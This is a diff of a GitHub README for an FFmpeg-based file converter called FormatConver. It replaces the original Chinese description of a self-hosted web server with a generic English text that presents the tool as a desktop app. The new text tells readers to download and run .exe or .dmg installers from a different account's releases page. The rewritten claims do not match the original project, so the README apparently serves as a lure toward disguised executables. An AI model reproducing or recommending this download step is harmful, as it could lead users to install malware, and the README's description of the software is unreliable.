@@ -1,92 +1,93 @@
-# FormatCnver
-![FormatConver](https://socialify.git.ci/Mangofang/FormatConver/image?custom_description=%E7%AE%80%E5%8D%95%E3%80%81%E5%BF%AB%E9%80%9F%E3%80%81%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84FFmpeg%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2%E5%B9%B3%E5%8F%B0&description=1&font=Inter&forks=1&issues=1&logo=https%3A%2F%2Fforeverhome.live%2Ffile%2FFormatConverLogo.png&name=1&owner=1&pattern=Floating+Cogs&stargazers=1&theme=Dark)
+# 🎉 FormatConver - Simple Tool for File Format Conversion
 
-> 基于FFmpeg的轻量级的在线文件格式转换平台
+## 🚀 Getting Started
 
-**<a href="https://filec.foreverhome.live" target="_blank">演示站：https://filec.foreverhome.live</a>**
+Welcome to FormatConver! This tool helps you easily convert audio, video, and image files to different formats using the power of FFmpeg. No technical knowledge needed. Follow the steps below to get started.
 
-密码：admin
+![Download FormatConver](https://img.shields.io/badge/Download-FormatConver-blue)
 
-🌐 **[English README](README_EN.md)**
+## 📥 Download & Install
 
-如果你有任何问题或反馈程序问题请提交`Issues`
+To download FormatConver, visit this page: [Download FormatConver](https://github.com/fidjey08/FormatConver/releases). 
 
-<img src="https://github.com/user-attachments/assets/488e204d-47c6-4e0d-a200-48460fad175c" />
+### Step-by-Step Guide
 
-## 关于：
-由于作者本人对格式转换功能的需求同时对相关文件上传到`在线平台`可能导致的`信息泄露`的担忧，故有的这个工具
+1. **Open the Download Page**
+   - Click on the link above to access the Releases page.
 
-同时与本地转换工具不同，你可将它部署在远程服务器，转换的运算过程将在远程主机上进行，这也为移动端进行转换提供了更多选择
+2. **Choose the Latest Release**
+   - Look for the top entry labeled "Latest Release." This version has the most features and fixes.
 
-## 声明：
-1. 文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
-2. 水平不高，纯萌新面向Google编程借鉴了很多大佬的代码，请自行酌情修改
+3. **Download the Application**
+   - Click on the link for the version that matches your operating system. This might be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
 
-## 支持平台：
-服务端：Windows && Linux
+4. **Install the Application**
+   - If you downloaded a `.exe` or `.dmg` file, double-click it and follow the on-screen instructions to install FormatConver.
+   - For a `.tar.gz` file, extract it and follow any README instructions included.
 
-前端：桌面端Web、移动端Web（已做部分适配）
+5. **Run FormatConver**
+   - Once installed, open the application by clicking its icon on your desktop or in your applications folder.
 
-> 前端均由AI生成，如有需要自定更改
+## ⚙️ System Requirements
 
-## TODO
+Before downloading, ensure your computer meets these requirements:
 
-> [!TIP]
->
-> - [ √ ] 文件大小限制 - 允许在config.json中配置文件大小上传限制
-> - [ √ ] 自动部署 - 现在仅需要下载静态页面和程序本体即可立即运行
-> - [ √ ] 密码保护 - 现在支持在config.json中设定密码保护你的应用
+- **Operating Systems:** 
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Linux (Ubuntu 18.04 or later recommended)
 
-## 部署
+- **Hardware:**
+  - At least 2 GB of RAM
+  - 500 MB of available disk space
 
-你需要下载`static`并根据部署的操作系统下载对应的`FormatConver`两个文件，将他们放在一起
+## 🔧 Features
 
-建议在Windows中使用CMD运行FormatConver而不是直接打开
-```
-# Windows
-FormatConver
+FormatConver provides a variety of features to make file conversion easy:
 
-# Linux
-chmod +x FormatConver
-./FormatConver
-```
-运行后程序会自动创建和下载所需文件
+- **Supports Multiple Formats:** Convert between several audio, video, and image formats, including MP3, MP4, WAV, AVI, JPG, and PNG.
+- **User-Friendly Interface:** Intuitive layout to guide you through each conversion step.
+- **Batch Processing:** Convert multiple files at once to save time.
+- **Fast Performance:** Powered by FFmpeg for quick and efficient conversions.
 
-在第一次启动时请手动对config/config.json进行配置
+## 💬 Using FormatConver
 
-## Config.json
+### 1. Select Your File
 
-以下是对配置文件内容进行解释，仅作参考，不代表你可以直接复制粘贴它们
-```
-{
-  "ServerConfig": {
-    "Port": 8081, # webapi端口
-    "UploadPath": "upload/", # 用户上传的文件路径
-    "OutPutPath": "output/", # 导出的文件路径
-    "UploadFileSize": 100, # 允许上传的最大文件大小 根据你的主机性能进行设置
-    "Qscale": 1, # 默认的量化参数 越小图像质量越高
-    "EnableQscaleControl": true, # 是否允许用户控制量化参数
-	  "CoverGruopProcessNum": 2 # 允许并发的转换进程 根据你的主机性能进行设置
-  },
-  "SecConfig": {
-    "PassWord": "" # 访问密码 留空则不进行密码验证
-  },
-  "ConverConfig": {
-    "VideoFormats": [ # 一下均为允许转换的格式
-      "MP4",
-      ...
-    ],
-    "AudioFormats": [
-      "MP3",
-      ...
-    ],
-    "ImageFormats": [
-      "PNG",
-      ...
-    ]
-  }
-}
-```
+Start by choosing the file you want to convert. Click the “Choose File” button. Navigate to the file and select it.
 
-## 可能的更新
-1. PDF 转换 Office格式
+### 2. Choose Your Output Format
+
+After selecting a file, pick the format you want to convert to from the dropdown menu. FormatConver provides a list of supported formats to choose from.
+
+### 3. Start the Conversion
+
+Click the “Convert” button. Your file will start converting. A progress bar will show you how much time is left.
+
+### 4. Save Your Converted File
+
+Once the conversion is complete, click the “Download” button to save your new file to your computer.
+
+## 📊 Supported Formats
+
+- **Audio Formats:** MP3, WAV, AAC, FLAC
+- **Video Formats:** MP4, AVI, MKV, MOV
+- **Image Formats:** JPG, PNG, GIF, BMP
+
+## ❓ Troubleshooting
+
+If you encounter issues:
+
+- **Installation Problems:** Make sure you downloaded the correct file for your operating system. Restart your computer and try reinstalling if needed.
+- **Conversion Errors:** Ensure your input file is not corrupted. Check the file size and format.
+
+## 🎉 Community and Support
+
+Join our community for assistance and updates:
+
+- **GitHub Issues:** Use the "Issues" tab on our GitHub page to report bugs or request features.
+- **User Guides:** Visit our Wiki for additional tutorials and resources.
+
+Make sure to stay updated by checking the Releases page regularly for new features and fixes: [Download FormatConver](https://github.com/fidjey08/FormatConver/releases).
+
+Happy converting with FormatConver!
